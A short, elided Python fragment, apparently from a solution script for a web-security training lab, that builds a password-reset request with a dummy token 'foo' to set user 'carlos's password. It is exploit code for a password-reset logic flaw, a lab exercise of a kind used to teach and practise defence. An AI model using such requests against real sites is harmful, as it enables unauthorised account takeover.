...
def access_carlos_account(s, url):
    ...
    password_reset_url = url + "/forgot-password?temp-forgot-password-token=foo"
    password_reset_data = {"temp-forgot-password-token": "foo", "username": "carlos", "new-password-1": "password", "new-password-2": "password"}
